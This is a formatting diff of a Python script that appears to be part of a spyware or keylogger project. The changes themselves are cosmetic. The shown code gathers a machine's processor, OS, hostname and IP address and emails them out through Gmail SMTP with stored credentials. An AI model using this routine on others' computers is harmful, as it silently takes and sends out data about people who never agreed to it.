@@ -34,7 +34,7 @@ with open("password.txt","r") as f:
 def send_email(filename, attachment):
 	fromaddr = email_address
 	toaddr = email_address
-	
+
 	msg = MIMEMultipart()
 	msg['From'] = fromaddr
 	msg['To'] = toaddr
@@ -43,7 +43,7 @@ def send_email(filename, attachment):
 	body = "Body_of_the_mail"
 
 	msg.attach(MIMEText(body, 'plain'))
-	
+
 	filename = filename
 	attachment = open(attachment, "rb")
 
@@ -51,9 +51,9 @@ def send_email(filename, attachment):
 
 	p.set_payload((attachment).read())
 	encoders.encode_base64(p)
-	p.add_header('Content-Disposition', "attachment; filename = %s" % filename)
+	p.add_header('Content-Disposition', f"attachment; filename = {filename}")
 
-	msg.attach(p)	
+	msg.attach(p)
 	s = smtplib.SMTP('smtp.gmail.com', 587)
 	s.starttls()
 
@@ -68,12 +68,12 @@ def computer_information():
 	with open(system_information, "a") as f:
 		hostname = socket.gethostname()
 		IPAddr = socket.gethostbyname(hostname)
-		
+
 		f.write("Processor: " + (platform.processor() +"\n"))
-		f.write("System: " + platform.system() + " " + platform.version() + "\n")
-		f.write("Machine: " + platform.machine() + "\n")
-		f.write("Hostname: " + hostname + "\n")
-		f.write("IP Address: " + IPAddr + "\n")
+		f.write(f"System: {platform.system()} {platform.version()}" + "\n")
+		f.write(f"Machine: {platform.machine()}" + "\n")
+		f.write(f"Hostname: {hostname}" + "\n")
+		f.write(f"IP Address: {IPAddr}" + "\n")
 
 computer_information()
 send_email(system_information, system_information)
